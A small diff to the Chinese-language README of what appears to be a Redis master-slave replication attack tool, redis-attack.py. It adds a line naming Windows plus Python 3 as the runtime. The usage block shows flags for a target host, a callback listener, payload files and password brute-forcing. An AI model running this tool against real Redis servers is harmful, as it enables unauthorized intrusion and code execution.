@@ -36,7 +36,8 @@ Redis从2.8开始，就支持主从复制功能。
 │  redis-attack.py 攻击主程序
 ```
 
-## 用法
+## 用法   
+运行环境：Windows+python3
 ```
 usage: python redis-attack.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-wf WINFILE] [-lf LINUXFILE] [-a AUTH] [--brute] [-v]
 Example: python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 --brute
